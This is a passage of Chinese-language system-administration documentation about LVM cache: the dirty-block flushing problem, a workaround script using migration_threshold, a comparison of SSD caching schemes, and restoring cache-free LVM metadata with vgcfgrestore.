cache\uff0c\u200b\u53ea\u80fd\u200b\u7528\u200b\u4e00\u4e9b\u200b trick \u200b\u6765\u200b uncache \u200b\u6389\u200b\u8fd9\u4e2a\u200b\u574f\u6389\u200b\u7684\u200b LV \uff08cachevol \u200b\u53ef\u80fd\u200b\u4f1a\u200b\u9ebb\u70e6\u200b\u4e00\u4e9b\u200b\uff0c\u200b\u9700\u8981\u200b\u5148\u200b\u4f7f\u7528\u200b <code>dmsetup remove</code> \u200b\u79fb\u9664\u200b\u591a\u4f59\u200b\u7684\u200b\u5377\u200b\uff1bcachepool \u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b uncache\uff09\u3002 \u200b\u6216\u8005\u200b\u5c06\u200b thin-provisioning-tools \u200b\u5347\u7ea7\u200b\u81f3\u200b 1.0.12 \u200b\u4ee5\u4e0a\u200b\u3002</p> <p>\u200b\u6765\u81ea\u200b linux-lvm \u200b\u90ae\u4ef6\u200b\u5217\u8868\u200b\u7684\u200b\u53ef\u80fd\u200b\u76f8\u5173\u200b\u7684\u200b\u6545\u969c\u200b\u62a5\u544a\u200b\u53c2\u89c1\u200b https://lore.kernel.org/all/b9e10482-e508-63fa-5518-94cccc007e81@redhat.com/T/\u3002</p> <p>\u200b\u6700\u65b0\u200b\u7684\u200b\u5185\u6838\u200b\u53ef\u80fd\u200b\u90e8\u5206\u200b\u4fee\u590d\u200b\u4e86\u200b\u540e\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b</p> <p>\u200b\u53c2\u89c1\u200b https://github.com/torvalds/linux/commit/1e4ab7b4c881cf26c1c72b3f56519e03475486fb\u3002 \u200b\u6839\u636e\u200b\u8be5\u200b commit \u200b\u7684\u200b\u63cf\u8ff0\u200b\uff0c\u200b\u5728\u200b cleaner \u200b\u72b6\u6001\u200b\u4e0b\u200b\u5373\u4f7f\u200b IO idle \u200b\u4e3a\u200b false\uff0c\u200b\u4e5f\u200b\u4f1a\u200b\u8fdb\u884c\u200b\u810f\u5757\u200b\u8fc1\u79fb\u200b\u3002</p> <p>lvmcache \u200b\u7684\u200b\u8bbe\u8ba1\u200b</p> <p>\u200b\u4ece\u200b\u524d\u9762\u200b\u7684\u200b\u7edf\u8ba1\u6570\u636e\u200b\u53ef\u4ee5\u200b\u6ce8\u610f\u200b\u5230\u200b\uff0c\u200b\u810f\u5757\u200b\u7684\u200b\u6570\u91cf\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6307\u6807\u200b\u3002\u200b\u5728\u200b lvmcache \u200b\u7684\u200b\u8bbe\u8ba1\u200b\u4e2d\u200b\uff0c\u200b\u5b58\u5728\u200b\u51fa\u73b0\u200b\u6a21\u5f0f\u200b\u4e3a\u200b writethrough \u200b\u5e76\u4e14\u200b\u5b58\u5728\u200b\u810f\u5757\u200b\u7684\u200b\u53ef\u80fd\u200b\uff0c\u200b\u6240\u4ee5\u200b\u76ee\u524d\u200b\u7a0b\u5e8f\u200b\u4e0a\u200b\u6ca1\u6709\u200b\u5b9e\u73b0\u200b\u770b\u5230\u200b writethrough \u200b\u4e4b\u540e\u200b \u200b\u5c31\u200b\u5ffd\u7565\u200b\u810f\u5757\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p> \u200b\u6a21\u62df\u200b\u5728\u200b IO \u200b\u538b\u529b\u200b\u4e0b\u200b\u8fc1\u79fb\u200b\u7f13\u6162\u200b\u7684\u200b\u60c5\u51b5\u200b <p>\u200b\u683c\u5f0f\u5316\u200b\u6211\u4eec\u200b\u521a\u624d\u200b\u521b\u5efa\u200b\u7684\u200b\u6709\u200b cache \u200b\u7684\u200b LV\uff0c\u200b\u4f7f\u7528\u200b <code>fio</code> \u200b\u4e0a\u200b\u70b9\u200b\u538b\u529b\u200b\uff1a</p> <pre><code>$ sudo fio --filename=./test --filesize=2G --direct=1 --rw=randrw --bs=4k --ioengine=libaio --iodepth=256 --runtime=120 --numjobs=4 --time_based --group_reporting --name=job_name --eta-newline=1\n</code></pre> <p>\u200b\u540c\u65f6\u200b\u505a\u200b\u5207\u6362\u200b cachemode \u200b\u7684\u200b\u64cd\u4f5c\u200b\uff1a</p> <pre><code>$ sudo lvchange --cachemode writeback vg201-test/lvdata\n  WARNING: repairing a damaged cachevol is not yet possible.\n  WARNING: cache mode writethrough is suggested for safe operation.\nContinue using writeback without repair?y\n  Logical volume vg201-test/lvdata changed.\n$ sudo lvchange --cachemode writethrough vg201-test/lvdata\n  Flushing 16401 blocks for cache vg201-test/lvdata.\n  Flushing 16405 blocks for cache vg201-test/lvdata.\n  Flushing 12309 blocks for cache vg201-test/lvdata.\n  Flushing 8213 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 6481 blocks for cache vg201-test/lvdata.\n  Flushing 2411 blocks for cache vg201-test/lvdata.\n  Logical volume vg201-test/lvdata changed.\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u6ce8\u610f\u200b\u5230\u200b\u5361\u200b\u5728\u200b\u4e86\u200b <code>Flushing 6481 blocks</code> \u200b\u6bd4\u8f83\u200b\u957f\u200b\u7684\u200b\u65f6\u95f4\u200b\u3002\u200b\u6d4b\u8bd5\u73af\u5883\u200b\u4e3a\u200b\u7b14\u8bb0\u672c\u7535\u8111\u200b\u7684\u200b NVMe SSD\uff0c\u200b\u5982\u679c\u200b\u662f\u200b\u5b9e\u9645\u200b\u7684\u200b HDD + \u200b\u8f83\u5927\u200b\u8d1f\u8f7d\u200b\u7684\u8bdd\u200b\uff0c\u200b\u95ee\u9898\u200b\u4f1a\u200b\u4e25\u91cd\u200b\u5f97\u200b\u591a\u200b\u3002</p> <p>@taoky: \u200b\u5176\u4ed6\u200b\u4fe1\u606f\u200b</p> <p>\u200b\u8fd9\u200b\u53ef\u80fd\u200b\u662f\u200b\u5bf9\u4e8e\u200b\u8f83\u5927\u200b\u7f13\u5b58\u200b\u3001\u200b\u8f83\u91cd\u200b\u7684\u200b\u8d1f\u8f7d\u200b\u4e0b\u200b lvmcache \u200b\u6700\u5927\u200b\u7684\u200b\u95ee\u9898\u200b\u4e86\u200b\u3002 \u200b\u5173\u4e8e\u200b\u4e0b\u9762\u200b\u5904\u7406\u200b\u4e0d\u200b\u65b9\u4fbf\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u6211\u200b\u5728\u200b lvm2 \u200b\u4ed3\u5e93\u200b\u63d0\u4ea4\u200b\u4e86\u200b issue: https://github.com/lvmteam/lvm2/issues/141\uff0c \u200b\u5e0c\u671b\u200b\u80fd\u591f\u200b\u5728\u200b lvm \u200b\u5de5\u5177\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u7ed5\u8fc7\u200b flush dirty block \u200b\u7684\u200b\u64cd\u4f5c\u200b\u3002</p> <p>\u200b\u4e0d\u8fc7\u200b\u6700\u4f73\u200b\u7684\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u53ef\u80fd\u200b\u8fd8\u662f\u200b\u7ed9\u200b kernel \u200b\u4ea4\u4e2a\u200b patch\uff0c\u200b\u5982\u679c\u200b\u76ee\u524d\u200b\u72b6\u6001\u200b\u662f\u200b writethrough \u200b\u5e76\u4e14\u200b dirty = 0 \u200b\u90a3\u4e48\u200b\u7ed9\u200b\u67d0\u4e2a\u200b struct \u200b\u8bbe\u200b\u4e00\u4e2a\u200b\u7279\u6b8a\u200b\u7684\u200b bit\u3002\u200b\u4f46\u662f\u200b\u611f\u89c9\u200b\u4e0d\u200b\u77e5\u9053\u200b\u5982\u4f55\u200b\u4e0b\u624b\u200b\uff0c\u200b\u53ea\u80fd\u200b\u4ee5\u540e\u200b\u518d\u8bf4\u200b\u4e86\u200b\u3002</p> <p>\u200b\u6839\u636e\u200b\u6587\u6863\u200b\uff0c<code>migration_threshold</code> \u200b\u53c2\u6570\u200b\u63a7\u5236\u200b\u6bcf\u6b21\u200b\u8fc1\u79fb\u200b\u810f\u5757\u200b\u7684\u200b\u6247\u533a\u200b\u6570\u91cf\u200b\u3002\u200b\u76f8\u5173\u200b\u7684\u200b bug report \u200b\u5efa\u8bae\u200b\u5c06\u200b\u8fd9\u4e2a\u200b\u503c\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b chunk size \u200b\u7684\u200b\u81f3\u5c11\u200b 8 \u200b\u500d\u200b\uff08\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b 2048\uff0c\u200b\u5bf9\u5e94\u200b 1M\uff09\u3002 \u200b\u5728\u200b\u8c03\u8bd5\u200b\u95ee\u9898\u200b\u65f6\u200b\u53d1\u73b0\u200b\uff0c\u200b\u4fee\u6539\u200b\u8fd9\u4e2a\u200b\u503c\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u5f3a\u5236\u200b\u8fc1\u79fb\u200b\uff08\u200b\u4f46\u662f\u200b\u8fc1\u79fb\u200b\u65f6\u200b\u6240\u6709\u200b\u76f8\u5173\u200b\u7684\u200b IO \u200b\u64cd\u4f5c\u200b\u90fd\u200b\u4f1a\u200b\u6682\u505c\u200b\uff09\uff0c\u200b\u811a\u672c\u200b\u7c7b\u4f3c\u200b\u8fd9\u6837\u200b\uff1a</p> <pre><code># dirty hack\nsudo lvchange --cachepolicy cleaner lug/repo\nfor i in `seq 1 1500`; do sudo lvchange --cachesettings migration_threshold=2113536 lug/repo &amp;&amp; sudo lvchange --cachesettings migration_threshold=16384 lug/repo &amp;&amp; echo $i &amp;&amp; sleep 15; done;\n# \u200b\u9700\u8981\u200b\u786e\u8ba4\u200b\u6ca1\u6709\u200b\u810f\u5757\u200b\u3002\u200b\u5982\u679c\u200b\u8fd8\u6709\u200b\u7684\u8bdd\u200b\u7ee7\u7eed\u6267\u884c\u200b\uff08\u200b\u6b21\u6570\u200b\u8c03\u5c0f\u200b\u4e00\u4e9b\u200b\uff09\n# \u200b\u5982\u679c\u200b\u662f\u4ece\u200b writeback \u200b\u5207\u6362\u200b\uff0c\u200b\u9700\u8981\u200b\u5148\u200b\u628a\u200b\u6a21\u5f0f\u200b\u5207\u200b\u5230\u200b writethrough\n# \u200b\u7136\u540e\u200b\u518d\u200b\u4fee\u6539\u200b cachepolicy \u200b\u5230\u200b smq\nsudo lvchange --cachepolicy smq lug/repo\n</code></pre> <p>\u200b\u5728\u200b\u6211\u4eec\u200b\u7684\u200b\u914d\u7f6e\u200b\u4e0b\u200b\uff0c\u200b\u5199\u200b\u5168\u90e8\u200b\u810f\u5757\u200b\u64cd\u4f5c\u200b\uff08\u200b\u5305\u62ec\u200b\u4e2d\u95f4\u200b\u7684\u200b <code>sleep</code> \u200b\u64cd\u4f5c\u200b\u5728\u5185\u200b\uff09\u200b\u9700\u8981\u200b\u5927\u7ea6\u200b 10 \u200b\u4e2a\u200b\u5c0f\u65f6\u200b\u3002</p> <p>GRUB \u200b\u53ef\u80fd\u200b\u65e0\u6cd5\u200b\u5904\u7406\u200b\u81ea\u5b9a\u4e49\u200b\u7684\u200b migration_threshold \u200b\u7b49\u200b\u5c5e\u6027\u200b</p> <p>\u200b\u53c2\u8003\u200b patch: https://github.com/taoky/grub/commit/484b718831ab3ca034bb5ea3624a85efeb5bf2ba\u3002</p> <p>\u200b\u76f8\u5173\u200b\u7684\u200b\u5907\u6ce8\u200b\u4fe1\u606f\u200b\uff1ahttps://blog.taoky.moe/attachments/2021-04-17-tunight/show.html#21\u3002</p> <p>\u200b\u867d\u7136\u200b\u8fd9\u4e2a\u200b patch \u200b\u4e5f\u200b\u6709\u200b\u95ee\u9898\u200b\uff0c\u200b\u5e76\u4e14\u200b GRUB \u200b\u7684\u200b\u5f00\u53d1\u200b\u975e\u5e38\u200b\u4e0d\u200b\u6d3b\u8dc3\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ef\u80fd\u200b\u4e00\u76f4\u200b\u90fd\u200b\u8981\u200b\u81ea\u5df1\u200b\u7f16\u8bd1\u200b GRUB \u200b\u4e86\u200b\u3002</p> <p>\u200b\u6211\u4eec\u200b\u76ee\u524d\u200b\u7684\u200b\u5efa\u8bae\u200b\u662f\u200b\u5728\u200b\u8ba1\u5212\u200b\u91cd\u542f\u200b\uff08\u200b\u7ef4\u62a4\u200b\u7a97\u53e3\u200b\uff09\u200b\u524d\u200b\u624b\u52a8\u200b\u5378\u8f7d\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5728\u200b\u91cd\u542f\u200b\u540e\u200b\u518d\u200b\u6302\u8f7d\u200b\uff08\u200b\u4e4b\u524d\u200b\u7ef4\u62a4\u200b\u65f6\u200b\u89c2\u5bdf\u200b\u5230\u200b\uff0c\u200b\u5373\u4f7f\u200b\u6b63\u5e38\u200b\u5173\u673a\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u51fa\u73b0\u200b\u810f\u5757\u200b\u7684\u200b\u95ee\u9898\u200b\uff09\u3002 \u200b\u53e6\u200b\u4e00\u79cd\u200b\u65b9\u5f0f\u200b\u662f\u200b\uff1a\uff08\u200b\u5728\u200b\u786e\u8ba4\u200b\u6ca1\u6709\u200b\u4e8b\u5b9e\u4e0a\u200b\u7684\u200b\u810f\u5757\u200b\u7684\u200b\u524d\u63d0\u200b\u4e0b\u200b\uff09\u200b\u624b\u52a8\u200b\u4fee\u6539\u200b LVM \u200b\u5143\u200b\u6570\u636e\u200b\uff0c\u200b\u628a\u200b\u7f13\u5b58\u200b\u6254\u6389\u200b\u3002</p> <p>\u200b\u5c0f\u5fc3\u200b\u64cd\u4f5c\u200b</p> <p>\u200b\u5bf9\u200b\u6bcf\u6b21\u200b LVM \u200b\u64cd\u4f5c\u200b\uff0clvm \u200b\u7684\u200b\u5de5\u5177\u200b\u90fd\u200b\u4f1a\u200b\u5728\u200b <code>/etc/lvm/archive</code> \u200b\u5907\u4efd\u200b\u64cd\u4f5c\u524d\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\u4fe1\u606f\u200b\uff0c\u200b\u540c\u65f6\u200b\u5728\u200b <code>/etc/lvm/backup</code> \u200b\u5b58\u50a8\u200b\u5f53\u524d\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd8\u662f\u200b\u5c3d\u91cf\u200b\u5c0f\u5fc3\u200b\uff0c\u200b\u4ee5\u514d\u200b\u917f\u6210\u200b\u60b2\u5267\u200b\u3002</p> \u200b\u6709\u200b cache \u200b\u7684\u200b VG \u200b\u5143\u200b\u6570\u636e\u200b\u4f8b\u5b50\u200b <pre><code># Generated by LVM2 version 2.03.23(2) (2023-11-21): Sun Feb 18 00:25:36 2024\n\ncontents = \"Text Format Volume Group\"\nversion = 1\n\ndescription = \"Created *after* executing 'lvconvert --type cache --cachevol lvdata_cache --config allocation/cache_pool_max_chunks=25148800 vg201-test/lvdata'\"\n\ncreation_host = \"shimarin.taoky.moe\"    # Linux shimarin.taoky.moe 6.6.10-arch1-1 #1 SMP PREEMPT_DYNAMIC Fri, 05 Jan 2024 16:20:41 +0000 x86_64\ncreation_time = 1708187136  # Sun Feb 18 00:25:36 2024\n\nvg201-test {\n    id = \"kDKbJ2-kebs-HaIJ-4Vfj-E4OB-aCce-yEcdAy\"\n    seqno = 34\n    format = \"lvm2\"         # informational\n    status = [\"RESIZEABLE\", \"READ\", \"WRITE\"]\n    flags = []\n    extent_size = 8192      # 4 Megabytes\n    max_lv = 0\n    max_pv = 0\n    metadata_copies = 0\n\n    physical_volumes {\n\n        pv0 {\n            id = \"VfZ83M-BPwe-bIQ1-JJRO-ZBSf-ks8d-fMln8E\"\n            device = \"/dev/loop0\"   # Hint only\n\n            status = [\"ALLOCATABLE\"]\n            flags = []\n            dev_size = 139586437120 # 65 Terabytes\n            pe_start = 2048\n            pe_count = 17039359 # 65 Terabytes\n        }\n\n        pv1 {\n            id = \"8hZXeS-gZJX-OfrY-vfUm-tG1R-pw3V-6c3CBI\"\n            device = \"/dev/loop1\"   # Hint only\n\n            status = [\"ALLOCATABLE\"]\n            flags = []\n            dev_size = 3221225472   # 1.5 Terabytes\n            pe_start = 2048\n            pe_count = 393215   # 1.5 Terabytes\n        }\n    }\n\n    logical_volumes {\n\n        lvdata {\n            id = \"6BsYbX-T21Z-BgiW-pZET-a3Lf-wcSh-E5hSm2\"\n            status = [\"READ\", \"WRITE\", \"VISIBLE\"]\n            flags = []\n            creation_time = 1708181300  # 2024-02-17 22:48:20 +0800\n            creation_host = \"shimarin.taoky.moe\"\n            segment_count = 1\n\n            segment1 {\n                start_extent = 0\n                extent_count = 17039359 # 65 Terabytes\n\n                type = \"cache+CACHE_USES_CACHEVOL\"\n                cache_pool = \"lvdata_cache_cvol\"\n                origin = \"lvdata_corig\"\n                metadata_format = 2\n                chunk_size = 128\n                cache_mode = \"writethrough\"\n                policy = \"smq\"\n                metadata_start = 0\n                metadata_len = 2170880\n                data_start = 2170880\n                data_len = 3219046400\n            }\n        }\n\n        lvdata_cache_cvol {\n            id = \"RuL2He-0xlL-J4fd-T0eD-2YTr-QASe-gsWtBV\"\n            status = [\"READ\", \"WRITE\"]\n            flags = [\"CACHE_VOL\"]\n            creation_time = 1708187133  # 2024-02-18 00:25:33 +0800\n            creation_host = \"shimarin.taoky.moe\"\n            segment_count = 1\n\n            segment1 {\n                start_extent = 0\n                extent_count = 393215   # 1.5 Terabytes\n\n                type = \"striped\"\n                stripe_count = 1    # linear\n\n                stripes = [\n                    \"pv1\", 0\n                ]\n            }\n        }\n\n        lvdata_corig {\n            id = \"xIprwR-KD4I-f6E8-tdgp-lcjN-iUdk-rS63YR\"\n            status = [\"READ\", \"WRITE\"]\n            flags = []\n            creation_time = 1708187136  # 2024-02-18 00:25:36 +0800\n            creation_host = \"shimarin.taoky.moe\"\n            segment_count = 1\n\n            segment1 {\n                start_extent = 0\n                extent_count = 17039359 # 65 Terabytes\n\n                type = \"striped\"\n                stripe_count = 1    # linear\n\n                stripes = [\n                    \"pv0\", 0\n                ]\n            }\n        }\n    }\n\n}\n</code></pre> \u200b\u6ca1\u6709\u200b cache \u200b\u7684\u200b VG \u200b\u5143\u200b\u6570\u636e\u200b\u4f8b\u5b50\u200b <p>\u200b\u4ee5\u4e0b\u200b\u4ec5\u200b\u5c55\u793a\u200b <code>logical_volumes</code> \u200b\u90e8\u5206\u200b\uff1a</p> <pre><code># \uff08\u200b\u7701\u7565\u200b\uff09\n\nvg201-test {\n    # \uff08\u200b\u7701\u7565\u200b\uff09\n\n    logical_volumes {\n\n        lvdata {\n            id = \"6BsYbX-T21Z-BgiW-pZET-a3Lf-wcSh-E5hSm2\"\n            status = [\"READ\", \"WRITE\", \"VISIBLE\"]\n            flags = []\n            creation_time = 1708181300  # 2024-02-17 22:48:20 +0800\n            creation_host = \"shimarin.taoky.moe\"\n            segment_count = 1\n\n            segment1 {\n                start_extent = 0\n                extent_count = 17039359 # 65 Terabytes\n\n                type = \"striped\"\n                stripe_count = 1    # linear\n\n                stripes = [\n                    \"pv0\", 0\n                ]\n            }\n        }\n\n        lvdata_cache {\n            id = \"RuL2He-0xlL-J4fd-T0eD-2YTr-QASe-gsWtBV\"\n            status = [\"READ\", \"WRITE\", \"VISIBLE\"]\n            flags = []\n            creation_time = 1708187133  # 2024-02-18 00:25:33 +0800\n            creation_host = \"shimarin.taoky.moe\"\n            segment_count = 1\n\n            segment1 {\n                start_extent = 0\n                extent_count = 393215   # 1.5 Terabytes\n\n                type = \"striped\"\n                stripe_count = 1    # linear\n\n                stripes = [\n                    \"pv1\", 0\n                ]\n            }\n        }\n    }\n\n}\n</code></pre> <p>\u200b\u9996\u5148\u200b\u5bf9\u6bd4\u200b archive \u200b\u548c\u200b backup \u200b\u4e2d\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\uff0c\u200b\u786e\u8ba4\u200b\u65e0\u8bef\u200b\u4e4b\u540e\u200b\u4f7f\u7528\u200b <code>vgcfgrestore</code> \u200b\u6062\u590d\u200b\u5143\u200b\u6570\u636e\u200b\u3002 \u200b\u67d0\u4e9b\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u7f16\u8f91\u200b\u5143\u200b\u6570\u636e\u6587\u4ef6\u200b\u4ee5\u200b\u7b26\u5408\u5b9e\u9645\u200b\u60c5\u51b5\u200b\uff08\u200b\u4f8b\u5982\u200b\u5728\u200b\u521b\u5efa\u200b\u7f13\u5b58\u200b\u4e4b\u540e\u200b\u53c8\u200b\u505a\u200b\u4e86\u200b\u5176\u4ed6\u200b\u64cd\u4f5c\u200b\uff09\u3002</p> <pre><code>$ sudo vgcfgrestore -f /etc/lvm/archive/vg201-test_00084-792872325.vg vg201-test\n  Volume group vg201-test has active volume: lvdata.\n  Volume group vg201-test has active volume: lvdata_cache_cvol.\n  Volume group vg201-test has active volume: lvdata_cache_cvol.\n  Volume group vg201-test has active volume: lvdata_cache_cvol.\n  Volume group vg201-test has active volume: lvdata_corig.\n  WARNING: Found 5 active volume(s) in volume group \"vg201-test\".\n  Restoring VG with active LVs, may cause mismatch with its metadata.\nDo you really want to proceed with restore of volume group \"vg201-test\", while 5 volume(s) are active? [y/n]: y\n  Restored volume group vg201-test.\n$ sudo lvs -a\n  WARNING: Detected cache segment type does not match expected type striped for vg201-test/lvdata.\n  LV           VG         Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert\n  lvdata       vg201-test -wi-XX--X- &lt;65.00t                                                    \n  lvdata_cache vg201-test -wi-a-----  &lt;1.50t\n</code></pre> <p>\u200b\u5728\u200b\u91cd\u65b0\u200b activate \u200b\u4e4b\u540e\u200b\uff0c\u200b\u72b6\u6001\u200b\u5373\u200b\u6062\u590d\u6b63\u5e38\u200b\uff1a</p> <pre><code>$ sudo vgchange -an vg201-test\n  0 logical volume(s) in volume group \"vg201-test\" now active\n$ sudo vgchange -ay vg201-test\n  2 logical volume(s) in volume group \"vg201-test\" now active\n$ sudo lvs -a\n  LV           VG         Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert\n  lvdata       vg201-test -wi-a----- &lt;65.00t                                                    \n  lvdata_cache vg201-test -wi-a-----  &lt;1.50t\n</code></pre>"},{"location":"ops/storage/lvm/#ssdcache-comparison","title":"\u7f13\u5b58\u200b\u65b9\u6848\u200b\u6bd4\u8f83","text":"<p>\u200b\u4f5c\u4e3a\u200b SSD \u200b\u7f13\u5b58\u200b\u90e8\u5206\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u200b\u5c0f\u8282\u200b\uff0c\u200b\u672c\u200b\u90e8\u5206\u200b\u4ee5\u200b\u8868\u683c\u200b\u5f62\u5f0f\u200b\u4ecb\u7ecd\u200b\u5df2\u6709\u200b\u7684\u200b SSD \u200b\u7f13\u5b58\u200b\u65b9\u6848\u200b\uff08\u200b\u5305\u62ec\u200b\u5df2\u7ecf\u200b\u4e0d\u518d\u200b\u7ef4\u62a4\u200b\u7684\u200b\uff09\u3002 \u200b\u6211\u4eec\u200b\u5efa\u8bae\u200b\u65e0\u8bba\u200b\u9009\u62e9\u200b\u4f55\u79cd\u200b\u65b9\u6848\u200b\uff0c\u200b\u90fd\u200b\u9700\u8981\u200b\u5148\u200b\u6d4b\u8bd5\u200b\u5176\u200b\u662f\u5426\u200b\u6613\u4e8e\u200b\u4f7f\u7528\u200b\uff0c\u200b\u662f\u5426\u200b\u4f1a\u200b\u7ed9\u200b\u8fd0\u7ef4\u200b\u64cd\u4f5c\u200b\u5e26\u6765\u200b\u989d\u5916\u200b\u7684\u200b\u8d1f\u62c5\u200b\u3002</p> \u200b\u65b9\u6848\u200b \u200b\u7f13\u5b58\u200b\u6a21\u5f0f\u200b \u200b\u7f13\u5b58\u200b\u7b97\u6cd5\u200b \u200b\u7b80\u4ecb\u200b \u200b\u4e0a\u6b21\u200b\u7ef4\u62a4\u200b\u65f6\u95f4\u200b<sup>3</sup> lvmcache writethrough, writeback smq \u200b\u4e0e\u200b LVM \u200b\u96c6\u6210\u200b\u7684\u200b\u7f13\u5b58\u200b\u65b9\u6848\u200b\uff0c\u200b\u57fa\u4e8e\u200b\u5185\u6838\u200b\u7684\u200b dm-cache 7 \u200b\u4e2a\u200b\u6708\u200b\u524d\u200b bcache writethrough, writeback, writearound lru, fifo, random \u200b\u5df2\u200b\u5728\u200b\u5185\u6838\u200b\u4e2d\u200b\u7684\u200b\u7a33\u5b9a\u200b cache \u200b\u65b9\u6848\u200b 2 \u200b\u4e2a\u200b\u6708\u200b\u524d\u200b ZFS ARC + L2ARC \u200b\u7c7b\u4f3c\u200b writearound ARC ZFS \u200b\u81ea\u5e26\u200b\u7684\u200b\u7f13\u5b58\u200b\u3002ARC \u200b\u4ee5\u200b\u5185\u5b58\u200b\u4e3a\u200b\u7f13\u5b58\u200b\uff1bL2ARC \u200b\u4f5c\u4e3a\u200b\u7b2c\u4e8c\u7ea7\u200b\u7f13\u5b58\u200b\uff0c\u200b\u4f7f\u7528\u200b SSD\uff0c\u200b\u7528\u4e8e\u200b\u5728\u200b\u9ad8\u200b\u8d1f\u8f7d\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u652f\u6491\u200b IOPS\uff0c\u200b\u547d\u4e2d\u7387\u200b\u8f83\u200b\u4f4e\u200b \u200b\u968f\u200b ZFS \u200b\u5f00\u53d1\u200b EnhanceIO readonly (writearound), writethrough, writeback lru, fifo, random \u200b\u65e9\u671f\u200b\u7684\u200b SSD \u200b\u7f13\u5b58\u200b\u65b9\u6848\u200b \u2620\ufe0f 9 \u200b\u5e74\u524d\u200b Flashcache writethrough, writeback, writearound fifo, lru Facebook \u200b\u5f00\u53d1\u200b\u7684\u200b\u65e9\u671f\u200b SSD \u200b\u7f13\u5b58\u200b\u65b9\u6848\u200b \u2620\ufe0f 7 \u200b\u5e74\u524d\u200b OpenCAS writethrough, writeback, writearound, write-invalidate, write-only lru (?) SPDK \u200b\u7684\u200b\u4e00\u90e8\u5206\u200b 3 \u200b\u4e2a\u200b\u6708\u200b\u524d\u200b bcachefs writethrough, writeback, writearound lru<sup>4</sup> \u200b\u7531\u200b bcache \u200b\u4f5c\u8005\u200b\u5f00\u53d1\u200b\u7684\u200b\u65b0\u200b CoW \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u5185\u7f6e\u200b SSD \u200b\u7f13\u5b58\u200b\u652f\u6301\u200b \u200b\u6d3b\u8dc3\u200b\u5f00\u53d1"},{"location":"ops/storage/lvm/#lvm-cluster","title":"\u96c6\u7fa4\u200b\u5b58\u50a8","text":"<p>LVM \u200b\u652f\u6301\u200b\u591a\u673a\u200b\u5171\u4eab\u200b\u5b58\u50a8\u200b\u3002\u200b\u5728\u200b\u8fd9\u79cd\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u96c6\u7fa4\u200b\u4e2d\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u901a\u8fc7\u200b iSCSI 